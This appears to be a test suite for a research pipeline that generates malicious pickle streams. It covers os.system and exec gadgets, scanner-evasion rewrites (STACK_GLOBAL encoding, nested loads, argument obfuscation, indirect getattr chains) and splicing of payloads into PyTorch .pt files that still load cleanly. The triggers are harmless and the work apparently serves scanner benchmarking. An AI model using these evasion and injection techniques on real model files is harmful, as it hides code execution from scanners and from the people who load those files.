"""Phase 1 tests — evasion strategies (pipeline/evasion.py), encoding mutator,
and the indirect_chain stealth family.

Every strategy must preserve execution semantics exactly: load-equivalence on
a benign base dict, and trigger execution for malicious streams. Structural
invariants (parse round-trip, STOP placement, PROTO correctness) are checked
per strategy.
"""

from __future__ import annotations

import pickle
import random
import struct
import os
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pipeline.opcodes import OPCODES_BY_NAME, parse_pickle  # noqa: E402
from pipeline.evasion import (  # noqa: E402
    STRATEGIES,
    apply_pipeline,
    get_strategy,
    select_strategies,
)
from pipeline.mutators import PickleMutator  # noqa: E402
from pipeline.templates import (  # noqa: E402
    FAMILIES,
    IndirectChainTemplate,
    family_template,
)

OP = OPCODES_BY_NAME


def _op(name):
    return OP[name]


def _malicious_stream(trigger: str) -> bytes:
    """Standard gadget stream: GLOBAL os.system + (trigger,) REDUCE."""
    return b"".join([
        OP["GLOBAL"].code + b"os\nsystem\n",
        pickle.dumps((trigger,), protocol=2)[2:-1],
        OP["REDUCE"].code,
        OP["STOP"].code,
    ])


def _assert_parses(self, blob: bytes) -> list:
    parsed = parse_pickle(blob)
    self.assertEqual(parsed[-1][0].name, "STOP")
    self.assertEqual(b"".join(o.code + a for o, a in parsed), blob)
    return parsed


class TestStackGlobalEncoding(unittest.TestCase):
    def setUp(self):
        self.s = STRATEGIES["stack_global_encoding"]

    def test_global_is_rewritten_and_load_equivalent(self):
        base = {"f": len, "meta": "benign"}  # dict with a GLOBAL (builtins.len)
        blob = pickle.dumps(base, protocol=2)
        out = self.s.apply(blob)
        parsed = _assert_parses(self, out)
        # No GLOBAL/INST remains; STACK_GLOBAL present; PROTO bumped to 4.
        self.assertFalse([1 for o, _ in parsed if o.name in ("GLOBAL", "INST")])
        self.assertTrue(any(o.name == "STACK_GLOBAL" for o, _ in parsed))
        self.assertEqual(out[0], 0x80)
        self.assertGreaterEqual(out[1], 4)
        self.assertEqual(pickle.loads(out), base)

    def test_malicious_stream_hides_delimited_import_operand(self):
        out = self.s.apply(_malicious_stream("true"))
        self.assertNotIn(b"os\nsystem\n", out)
        self.assertEqual(pickle.loads(out), 0)

    def test_non_proto_stream_untouched_when_no_globals(self):
        blob = pickle.dumps({"a": 1}, protocol=5)
        self.assertEqual(self.s.apply(blob), blob)


class TestNestedLoadsWrap(unittest.TestCase):
    def setUp(self):
        self.s = STRATEGIES["nested_loads_wrap"]

    def test_outer_stream_only_references_pickle_loads(self):
        inner = _malicious_stream("true")
        outer = self.s.apply(inner)
        _assert_parses(self, outer)
        self.assertIn(b"_pickle\nloads\n", outer)
        # Inner dangerous import survives only inside opaque BINBYTES blobs.
        outside_blobs = b"".join(
            o.code + a for o, a in parse_pickle(outer)
            if o.name not in ("BINBYTES", "SHORT_BINBYTES")
        )
        self.assertNotIn(b"os\nsystem\n", outside_blobs)
        self.assertNotIn(b"true", outside_blobs)
        # Execution preserved: loads returns os.system's exit status.
        self.assertEqual(pickle.loads(outer), 0)

    def test_benign_stream_round_trips(self):
        base = {"k": [1, 2, 3]}
        out = self.s.apply(pickle.dumps(base, protocol=4))
        self.assertEqual(pickle.loads(out), base)


class TestPayloadObfuscation(unittest.TestCase):
    def setUp(self):
        self.s = STRATEGIES["payload_obfuscation"]

    def test_string_arg_hidden_but_sink_receives_identical_value(self):
        sentinel = "python3 -c 'regenbench_sentinel_123'"
        stream = b"".join([
            OP["GLOBAL"].code + b"builtins\nstr\n",  # identity-ish benign sink
            pickle.dumps((sentinel,), protocol=2)[2:-1],
            OP["REDUCE"].code,
            OP["STOP"].code,
        ])
        out = self.s.apply(stream)
        _assert_parses(self, out)
        # Plaintext survives only inside opaque BINBYTES blobs (the nested
        # pickle); no string-opcode context may carry it.
        outside_blobs = b"".join(
            o.code + a for o, a in parse_pickle(out)
            if o.name not in ("BINBYTES", "SHORT_BINBYTES")
        )
        self.assertNotIn(sentinel.encode(), outside_blobs)
        self.assertEqual(pickle.loads(out), sentinel)

    def test_multi_arg_tuples_pass_through(self):
        stream = b"".join([
            OP["GLOBAL"].code + b"builtins\nexec\n",
            pickle.dumps(("1+1", {}), protocol=2)[2:-1],
            OP["REDUCE"].code,
            OP["STOP"].code,
        ])
        self.assertEqual(self.s.apply(stream), stream)

    def test_literal_bytes_arg_hidden(self):
        payload = b"with open('/tmp/x','w') as f: f.write('1')"
        # Literal BINBYTES tuple region (no interleaved _codecs.encode call).
        stream = b"".join([
            OP["GLOBAL"].code + b"builtins\nexec\n",
            OP["MARK"].code,
            OP["BINBYTES"].code + struct.pack("<I", len(payload)) + payload,
            OP["TUPLE"].code,
            OP["REDUCE"].code,
            OP["STOP"].code,
        ])
        out = self.s.apply(stream)
        outside_blobs = b"".join(
            o.code + a for o, a in parse_pickle(out)
            if o.name not in ("BINBYTES", "SHORT_BINBYTES")
        )
        self.assertNotIn(payload, outside_blobs)
        self.assertIsNone(pickle.loads(out))  # exec returns None

    def test_bytes_arg_with_codecs_wrapper_passes_through(self):
        payload = b"x=1"
        stream = b"".join([
            OP["GLOBAL"].code + b"builtins\nexec\n",
            pickle.dumps((payload,), protocol=2)[2:-1],
            OP["REDUCE"].code,
            OP["STOP"].code,
        ])
        self.assertEqual(self.s.apply(stream), stream)


class TestIndirectChainStrategy(unittest.TestCase):
    def setUp(self):
        self.s = STRATEGIES["indirect_chain"]

    def test_no_dangerous_global_operand_remains(self):
        from pipeline.registry import get_entry
        out = self.s.apply(_malicious_stream("echo hi"))
        parsed = _assert_parses(self, out)
        globals_seen = [
            arg.decode("latin1").rstrip("\n").split("\n")
            for o, arg in parsed if o.name == "GLOBAL"
        ]
        self.assertTrue(globals_seen)
        for module, name in globals_seen:
            entry = get_entry(module, name)
            # Smuggling primitives (getattr/__import__) may appear; no
            # code-executing sink may remain as a direct GLOBAL operand.
            self.assertTrue(
                entry is None or not entry.genuine_code_exec,
                f"{module}.{name} still names an executing sink",
            )

    def test_chain_executes_original_sink(self):
        out = self.s.apply(_malicious_stream("exit 3"))
        # os.system("exit 3") -> wait status 3 << 8 = 768
        self.assertEqual(pickle.loads(out), 768)


class TestApplyPipelineAndSelection(unittest.TestCase):
    def test_pipeline_composition_preserves_execution(self):
        rng = random.Random(20260823)
        for seed in range(10):
            rng.seed(seed)
            names = select_strategies(rng)
            out = apply_pipeline(_malicious_stream("true"), list(names))
            parse_pickle(out)  # structural sanity
            self.assertEqual(pickle.loads(out), 0, f"seed={seed} names={names}")

    def test_unknown_names_ignored(self):
        blob = _malicious_stream("true")
        self.assertEqual(apply_pipeline(blob, ["nope"]), blob)

    def test_get_strategy_unknown(self):
        self.assertIsNone(get_strategy("nope"))
        self.assertIsNotNone(get_strategy("stack_global_encoding"))


class TestEncodingMutator(unittest.TestCase):
    def test_mutate_opcode_encoding_only_touches_globals(self):
        m = PickleMutator()
        op, arg = m.mutate_opcode_encoding(_op("BINUNICODE"), b"\x03abc")
        self.assertEqual((op.name, arg), ("BINUNICODE", b"\x03abc"))
        new_op, new_arg = m.mutate_opcode_encoding(_op("GLOBAL"), b"os\nsystem\n")
        self.assertEqual(new_op.name, "STACK_GLOBAL")
        self.assertNotIn(b"os\nsystem", new_arg)

    def test_mutate_with_encoding_prob_keeps_load_semantics(self):
        random.seed(11)
        m = PickleMutator()
        base = {"w": [1.0, 2.0], "s": "benign"}
        blob = pickle.dumps(base, protocol=4)
        out = m.mutate(blob, op_swap_prob=0.0, callable_sub_prob=0.0,
                       arg_fuzz_prob=0.0, stack_prob=0.0, encoding_prob=0.9)
        self.assertEqual(pickle.loads(out), base)


class TestIndirectChainFamily(unittest.TestCase):
    def test_family_registered(self):
        self.assertIn("indirect_chain", FAMILIES)
        self.assertIsInstance(family_template("indirect_chain"),
                              IndirectChainTemplate)

    def test_stream_structure_has_no_dangerous_global(self):
        from pipeline.registry import get_entry
        t = IndirectChainTemplate()
        blob = t.generate_pickle_payload("__regenbench_sentinel__")
        parsed = parse_pickle(blob)
        self.assertEqual(parsed[0][0].name, "PROTO")
        self.assertEqual(parsed[-1][0].name, "STOP")
        for op, arg in parsed:
            if op.name == "GLOBAL":
                mod, name = arg.decode("latin1").rstrip("\n").split("\n")[:2]
                entry = get_entry(mod, name)
                self.assertTrue(
                    entry is None or not entry.genuine_code_exec,
                    f"{mod}.{name} still names an executing sink",
                )

    def test_trigger_text_present_as_wrapped_arg(self):
        blob = IndirectChainTemplate().generate_pickle_payload("SENTINEL_XYZ")
        self.assertIn(b"SENTINEL_XYZ", blob)


class TestSpliceTransport(unittest.TestCase):
    """Regression: splice transport must not re-introduce flagged signatures
    and must keep the host stack balanced (benign object stays top)."""

    def _make_pt_bytes(self, proto=4):
        import io, zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("archive/version", b"3")
            z.writestr("archive/data.pkl", pickle.dumps({"w": [1.0]}, protocol=proto))
        return buf.getvalue()

    def test_splice_removes_loads_wrapper_and_balances_stack(self):
        from pipeline.templates import inject_payload_into_torch
        import tempfile, zipfile, struct
        with tempfile.TemporaryDirectory() as d:
            b = os.path.join(d, "b.pt"); e = os.path.join(d, "e.pt")
            with open(b, "wb") as f:
                f.write(self._make_pt_bytes())
            payload = b"".join([
                OP["GLOBAL"].code + b"builtins\nstr\n",
                pickle.dumps(("x",), protocol=2)[2:-1],
                OP["REDUCE"].code,
                OP["STOP"].code,
            ])
            inject_payload_into_torch(b, e, payload, transport="splice")
            with zipfile.ZipFile(e) as z:
                pkl = z.read("archive/data.pkl")
        self.assertNotIn(b"_pickle\nloads\n", pkl)
        parsed = parse_pickle(pkl)
        self.assertEqual(parsed[-1][0].name, "STOP")
        # No nested FRAME opcodes inside the (possibly open) outer frame.
        self.assertNotIn(OP["FRAME"].code, pkl[11:])
        # Frame length repaired for proto-4 bases.
        if pkl[0] == 0x80 and pkl[2] == 0x95:
            self.assertEqual(struct.unpack("<Q", pkl[3:11])[0], len(pkl) - 11)
        # Stack balance: torch gets the benign dict back, payload ran.
        self.assertEqual(pickle.loads(pkl), {"w": [1.0]})

    def test_unknown_transport_rejected(self):
        from pipeline.templates import inject_payload_into_torch
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            b = os.path.join(d, "b.pt"); e = os.path.join(d, "e.pt")
            with open(b, "wb") as f:
                f.write(self._make_pt_bytes())
            with self.assertRaises(ValueError):
                inject_payload_into_torch(b, e, b"\x80\x04N.", transport="nope")


class TestStreamFusionHardening(unittest.TestCase):
    """Regression: fused multi-stream inputs must not corrupt splices and
    structurally-insane gadget streams must be resampled, not emitted."""

    def _make_pt_bytes(self):
        import io, zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("archive/version", b"3")
            z.writestr("archive/data.pkl",
                       pickle.dumps({"w": [1.0]}, protocol=4))
        return buf.getvalue()

    def test_splice_truncates_at_first_stop(self):
        from pipeline.templates import inject_payload_into_torch
        import tempfile, zipfile
        # payload + stacked trailer (torch.load ignores the trailer)
        payload = (OP["GLOBAL"].code + b"os\nsystem\n"
                   + pickle.dumps(("true",), protocol=2)[2:-1]
                   + OP["REDUCE"].code + OP["STOP"].code)
        payload += pickle.dumps({"fuzzed_stack_payload": True}, protocol=5)
        with tempfile.TemporaryDirectory() as d:
            b = os.path.join(d, "b.pt"); e = os.path.join(d, "e.pt")
            with open(b, "wb") as f:
                f.write(self._make_pt_bytes())
            inject_payload_into_torch(b, e, payload, transport="splice")
            with zipfile.ZipFile(e) as z:
                pkl = z.read("archive/data.pkl")
        # No trace of the trailer inside the host stream.
        self.assertNotIn(b"fuzzed_stack_payload", pkl)
        self.assertNotIn(OP["PROTO"].code + b"\x05", pkl[11:])
        self.assertEqual(pickle.loads(pkl), {"w": [1.0]})

    def test_structurally_sane_rejects_fused_streams(self):
        from pipeline.generator import _structurally_sane
        good = pickle.dumps({"a": 1}, protocol=5)
        self.assertTrue(_structurally_sane(good))
        fused = good + pickle.dumps({"b": 2}, protocol=5)
        self.assertFalse(_structurally_sane(fused))
        self.assertFalse(_structurally_sane(b"\x80\x04\xff"))  # truncated

    def test_generator_resamples_instead_of_emitting_fusion(self):
        from pipeline.generator import CandidateGenerator
        gen = CandidateGenerator()
        random.seed(3)
        # High mutation probabilities maximize fusion odds; any emitted
        # candidate must pass the sanity gate.
        for trial in range(40):
            blob = gen.generate_candidate_pt(
                benign_pt_bytes=self._make_pt_bytes(),
                payload_code="x=1",
                dangerous_callable=("os", "system"),
                attack_family="gadget",
                mutation_prob=0.15,
                op_swap_prob=0.35, callable_sub_prob=0.35,
                arg_fuzz_prob=0.40, stack_prob=0.5,
                evasion_strategies=[], injection_transport="splice")
            import zipfile, io
            with zipfile.ZipFile(io.BytesIO(blob)) as z:
                pkl = z.read("archive/data.pkl")
            from pipeline.generator import _structurally_sane
            # Host stream: harness dict + spliced body -> exactly one STOP.
            parsed = parse_pickle(pkl)
            self.assertEqual(sum(1 for o, _ in parsed if o.name == "STOP"), 1)


if __name__ == "__main__":
    unittest.main()
